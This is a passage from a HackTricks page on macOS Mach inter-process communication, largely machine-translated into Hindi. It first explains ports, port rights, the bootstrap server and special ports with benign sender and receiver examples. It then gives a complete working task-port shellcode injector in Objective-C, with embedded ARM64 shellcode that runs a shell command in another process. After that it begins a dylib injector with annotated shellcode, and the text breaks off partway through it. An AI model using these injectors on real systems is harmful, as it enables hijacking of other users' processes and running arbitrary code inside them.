# macOS IPC - Inter Process Communication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mach messaging via Ports

### Basic Information

Mach **कार्य** को संसाधनों को साझा करने के लिए **सबसे छोटे इकाई** के रूप में उपयोग करता है, और प्रत्येक कार्य में **कई थ्रेड** हो सकते हैं। ये **कार्य और थ्रेड 1:1 के अनुपात में POSIX प्रक्रियाओं और थ्रेड्स से मैप होते हैं**।

कार्य के बीच संचार Mach इंटर-प्रोसेस संचार (IPC) के माध्यम से होता है, जो एकतरफा संचार चैनलों का उपयोग करता है। **संदेश पोर्ट के बीच स्थानांतरित होते हैं**, जो **कर्नेल द्वारा प्रबंधित संदेश कतारों** की तरह कार्य करते हैं।

प्रत्येक प्रक्रिया में एक **IPC तालिका** होती है, जिसमें प्रक्रिया के **mach पोर्ट** मिलते हैं। एक mach पोर्ट का नाम वास्तव में एक संख्या है (कर्नेल ऑब्जेक्ट के लिए एक पॉइंटर)।

एक प्रक्रिया किसी अन्य कार्य को कुछ अधिकारों के साथ एक पोर्ट नाम भी भेज सकती है और कर्नेल इस प्रविष्टि को **दूसरे कार्य की IPC तालिका** में प्रदर्शित करेगा।

### Port Rights

पोर्ट अधिकार, जो यह परिभाषित करते हैं कि एक कार्य कौन से संचालन कर सकता है, इस संचार के लिए कुंजी हैं। संभावित **पोर्ट अधिकार** हैं ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **प्राप्ति अधिकार**, जो पोर्ट पर भेजे गए संदेशों को प्राप्त करने की अनुमति देता है। Mach पोर्ट MPSC (multiple-producer, single-consumer) कतारें हैं, जिसका अर्थ है कि पूरे सिस्टम में **प्रत्येक पोर्ट के लिए केवल एक प्राप्ति अधिकार** हो सकता है (पाइप के विपरीत, जहां कई प्रक्रियाएं एक पाइप के पढ़ने के अंत के लिए फ़ाइल वर्णनकर्ता रख सकती हैं)।
* **प्राप्ति** अधिकार वाला एक **कार्य** संदेश प्राप्त कर सकता है और **भेजने के अधिकार** बना सकता है, जिससे इसे संदेश भेजने की अनुमति मिलती है। मूल रूप से केवल **स्वयं का कार्य अपने पोर्ट पर प्राप्ति अधिकार रखता है**।
* **भेजने का अधिकार**, जो पोर्ट पर संदेश भेजने की अनुमति देता है।
* भेजने का अधिकार **क्लोन** किया जा सकता है ताकि एक कार्य जो भेजने का अधिकार रखता है, अधिकार को क्लोन कर सके और **इसे तीसरे कार्य को दे सके**।
* **एक बार भेजने का अधिकार**, जो पोर्ट पर एक संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
* **पोर्ट सेट अधिकार**, जो एक _पोर्ट सेट_ को दर्शाता है न कि एकल पोर्ट। एक पोर्ट सेट से संदेश को डीक्यू करने का अर्थ है कि यह उस पोर्ट में से एक संदेश को डीक्यू करता है जिसमें यह शामिल है। पोर्ट सेट का उपयोग एक साथ कई पोर्ट पर सुनने के लिए किया जा सकता है, जैसे कि Unix में `select`/`poll`/`epoll`/`kqueue`।
* **मृत नाम**, जो वास्तव में एक पोर्ट अधिकार नहीं है, बल्कि केवल एक प्लेसहोल्डर है। जब एक पोर्ट नष्ट होता है, तो पोर्ट के लिए सभी मौजूदा पोर्ट अधिकार मृत नामों में बदल जाते हैं।

**कार्य SEND अधिकारों को दूसरों को स्थानांतरित कर सकते हैं**, जिससे उन्हें संदेश वापस भेजने की अनुमति मिलती है। **SEND अधिकारों को भी क्लोन किया जा सकता है, ताकि एक कार्य इसे डुप्लिकेट कर सके और तीसरे कार्य को अधिकार दे सके**। यह, एक मध्यवर्ती प्रक्रिया के साथ मिलकर जिसे **बूटस्ट्रैप सर्वर** कहा जाता है, कार्यों के बीच प्रभावी संचार की अनुमति देता है।

### File Ports

फाइल पोर्ट मैक पोर्ट्स में फ़ाइल वर्णनकर्ताओं को संलग्न करने की अनुमति देते हैं (Mach पोर्ट अधिकारों का उपयोग करके)। एक दिए गए FD से `fileport_makeport` का उपयोग करके एक `fileport` बनाना संभव है और एक fileport से FD बनाने के लिए `fileport_makefd` का उपयोग करना संभव है।

### Establishing a communication

#### Steps:

जैसा कि उल्लेख किया गया है, संचार चैनल स्थापित करने के लिए, **बूटस्ट्रैप सर्वर** (**launchd** in mac) शामिल है।

1. कार्य **A** एक **नया पोर्ट** आरंभ करता है, प्रक्रिया में एक **प्राप्ति अधिकार** प्राप्त करता है।
2. कार्य **A**, जो प्राप्ति अधिकार का धारक है, **पोर्ट के लिए एक भेजने का अधिकार उत्पन्न करता है**।
3. कार्य **A** **बूटस्ट्रैप सर्वर** के साथ एक **संयोग** स्थापित करता है, **पोर्ट के सेवा नाम** और **भेजने के अधिकार** को बूटस्ट्रैप रजिस्टर के रूप में ज्ञात प्रक्रिया के माध्यम से प्रदान करता है।
4. कार्य **B** **बूटस्ट्रैप सर्वर** के साथ बातचीत करता है ताकि सेवा नाम के लिए बूटस्ट्रैप **लुकअप** किया जा सके। यदि सफल होता है, तो **सर्वर कार्य A से प्राप्त भेजने के अधिकार को डुप्लिकेट करता है** और **इसे कार्य B को भेजता है**।
5. भेजने के अधिकार को प्राप्त करने पर, कार्य **B** **एक संदेश तैयार करने** और **कार्य A** को **भेजने** में सक्षम होता है।
6. द्विदिशीय संचार के लिए आमतौर पर कार्य **B** एक नए पोर्ट के साथ **प्राप्ति** अधिकार और **भेजने** का अधिकार उत्पन्न करता है, और **भेजने का अधिकार कार्य A को देता है** ताकि वह कार्य B को संदेश भेज सके (द्विदिशीय संचार)।

बूटस्ट्रैप सर्वर **सेवा नाम** का प्रमाणीकरण नहीं कर सकता है जो एक कार्य द्वारा दावा किया गया है। इसका अर्थ है कि एक **कार्य** संभावित रूप से **किसी भी सिस्टम कार्य का अनुकरण** कर सकता है, जैसे कि झूठा **प्राधिकरण सेवा नाम का दावा करना** और फिर हर अनुरोध को मंजूरी देना।

फिर, Apple **सिस्टम-प्रदत्त सेवाओं के नाम** को सुरक्षित कॉन्फ़िगरेशन फ़ाइलों में संग्रहीत करता है, जो **SIP-सुरक्षित** निर्देशिकाओं में स्थित हैं: `/System/Library/LaunchDaemons` और `/System/Library/LaunchAgents`। प्रत्येक सेवा नाम के साथ, **संबंधित बाइनरी भी संग्रहीत होती है**। बूटस्ट्रैप सर्वर, इन सेवा नामों के लिए एक **प्राप्ति अधिकार बनाएगा और रखेगा**।

इन पूर्वनिर्धारित सेवाओं के लिए, **लुकअप प्रक्रिया थोड़ी भिन्न होती है**। जब एक सेवा नाम की खोज की जा रही होती है, तो launchd सेवा को गतिशील रूप से शुरू करता है। नया कार्यप्रवाह इस प्रकार है:

* कार्य **B** एक सेवा नाम के लिए बूटस्ट्रैप **लुकअप** शुरू करता है।
* **launchd** जांचता है कि कार्य चल रहा है और यदि नहीं है, तो **इसे शुरू करता है**।
* कार्य **A** (सेवा) एक **बूटस्ट्रैप चेक-इन** करता है। यहाँ, **बूटस्ट्रैप** सर्वर एक भेजने का अधिकार बनाता है, इसे रखता है, और **प्राप्ति अधिकार कार्य A को स्थानांतरित करता है**।
* launchd **भेजने के अधिकार को डुप्लिकेट करता है और इसे कार्य B को भेजता है**।
* कार्य **B** एक नए पोर्ट के साथ **प्राप्ति** अधिकार और **भेजने** का अधिकार उत्पन्न करता है, और **भेजने का अधिकार कार्य A** (सेवा) को देता है ताकि वह कार्य B को संदेश भेज सके (द्विदिशीय संचार)।

हालांकि, यह प्रक्रिया केवल पूर्वनिर्धारित सिस्टम कार्यों पर लागू होती है। गैर-प्रणाली कार्य अभी भी मूल रूप से वर्णित तरीके से कार्य करते हैं, जो संभावित रूप से अनुकरण की अनुमति दे सकता है।

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` फ़ंक्शन, जो मूल रूप से एक सिस्टम कॉल है, Mach संदेश भेजने और प्राप्त करने के लिए उपयोग किया जाता है। फ़ंक्शन को भेजे जाने वाले संदेश को प्रारंभिक तर्क के रूप में आवश्यक होता है। यह संदेश `mach_msg_header_t` संरचना के साथ शुरू होना चाहिए, इसके बाद वास्तविक संदेश सामग्री होती है। संरचना को इस प्रकार परिभाषित किया गया है:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message. The bitflags in **`msgh_bits`** can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.
{% endhint %}

The other fields of the message header are:

* `msgh_size`: पूरे पैकेट का आकार।
* `msgh_remote_port`: वह पोर्ट जिस पर यह संदेश भेजा गया है।
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html)।
* `msgh_id`: इस संदेश की ID, जिसे रिसीवर द्वारा व्याख्यायित किया जाता है।

{% hint style="danger" %}
Note that **mach messages are sent over a \_mach port**\_, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.
{% endhint %}

### Enumerate ports
```bash
lsmp -p <pid>
```
आप इस टूल को iOS में [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके इंस्टॉल कर सकते हैं।

### कोड उदाहरण

ध्यान दें कि **प्रेषक** एक पोर्ट **आवंटित** करता है, नाम `org.darlinghq.example` के लिए एक **भेजने का अधिकार** बनाता है और इसे **बूटस्ट्रैप सर्वर** पर भेजता है जबकि प्रेषक ने उस नाम के **भेजने के अधिकार** के लिए अनुरोध किया और इसका उपयोग **संदेश भेजने** के लिए किया।

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### विशेष पोर्ट

* **होस्ट पोर्ट**: यदि किसी प्रक्रिया के पास इस पोर्ट पर **भेजने** का विशेषाधिकार है, तो वह **सिस्टम** के बारे में **जानकारी** प्राप्त कर सकता है (जैसे `host_processor_info`)।
* **होस्ट प्रिव पोर्ट**: इस पोर्ट पर **भेजने** का अधिकार रखने वाली प्रक्रिया **विशेषाधिकार प्राप्त क्रियाएँ** कर सकती है जैसे कि कर्नेल एक्सटेंशन लोड करना। इस अनुमति को प्राप्त करने के लिए **प्रक्रिया को रूट होना चाहिए**।
* इसके अलावा, **`kext_request`** API को कॉल करने के लिए अन्य विशेषाधिकार **`com.apple.private.kext*`** होना आवश्यक है, जो केवल Apple बाइनरी को दिए जाते हैं।
* **कार्य नाम पोर्ट:** _कार्य पोर्ट_ का एक अप्रिवileged संस्करण। यह कार्य को संदर्भित करता है, लेकिन इसे नियंत्रित करने की अनुमति नहीं देता। इसके माध्यम से उपलब्ध एकमात्र चीज `task_info()` प्रतीत होती है।
* **कार्य पोर्ट** (जिसे कर्नेल पोर्ट भी कहा जाता है): इस पोर्ट पर भेजने की अनुमति के साथ कार्य को नियंत्रित करना संभव है (मेमोरी पढ़ना/लिखना, थ्रेड बनाना...)।
* कॉल करें `mach_task_self()` इस पोर्ट के लिए **नाम प्राप्त करने** के लिए कॉलर कार्य के लिए। यह पोर्ट केवल **`exec()`** के माध्यम से **विरासत में** लिया जाता है; `fork()` के साथ बनाए गए नए कार्य को एक नया कार्य पोर्ट मिलता है (एक विशेष मामले के रूप में, एक कार्य को `exec()` के बाद एक suid बाइनरी में भी एक नया कार्य पोर्ट मिलता है)। एक कार्य को उत्पन्न करने और इसके पोर्ट को प्राप्त करने का एकमात्र तरीका ["पोर्ट स्वैप डांस"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) करना है जबकि `fork()` किया जा रहा है।
* पोर्ट तक पहुँचने के लिए ये प्रतिबंध हैं (बाइनरी `AppleMobileFileIntegrity` से `macos_task_policy` से):
* यदि ऐप के पास **`com.apple.security.get-task-allow` विशेषाधिकार** है, तो **समान उपयोगकर्ता** की प्रक्रियाएँ कार्य पोर्ट तक पहुँच सकती हैं (आमतौर पर डिबगिंग के लिए Xcode द्वारा जोड़ा जाता है)। **नोटरीकरण** प्रक्रिया इसे उत्पादन रिलीज़ में अनुमति नहीं देगी।
* **`com.apple.system-task-ports`** विशेषाधिकार वाले ऐप किसी भी प्रक्रिया के लिए **कार्य पोर्ट प्राप्त कर सकते हैं**, सिवाय कर्नेल के। पुराने संस्करणों में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple अनुप्रयोगों को दिया जाता है।
* **रूट कार्य पोर्ट्स** तक पहुँच सकता है उन अनुप्रयोगों के **जो** एक **हर्डनड** रनटाइम के साथ संकलित नहीं हैं (और Apple से नहीं हैं)।

### कार्य पोर्ट के माध्यम से थ्रेड में शेलकोड इंजेक्शन

आप एक शेलकोड प्राप्त कर सकते हैं:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**पिछले प्रोग्राम को संकलित करें** और कोड इंजेक्ट करने के लिए **अधिकार** जोड़ें उसी उपयोगकर्ता के साथ (यदि नहीं, तो आपको **sudo** का उपयोग करना होगा)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **यह posix compliant नहीं है**.

It was possible to **inject a simple shellcode** to execute a command because it **कोई posix** compliant apis के साथ काम करने की आवश्यकता नहीं थी, केवल Mach के साथ। **More complex injections** would need the **thread** to be also **posix compliant**.

Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
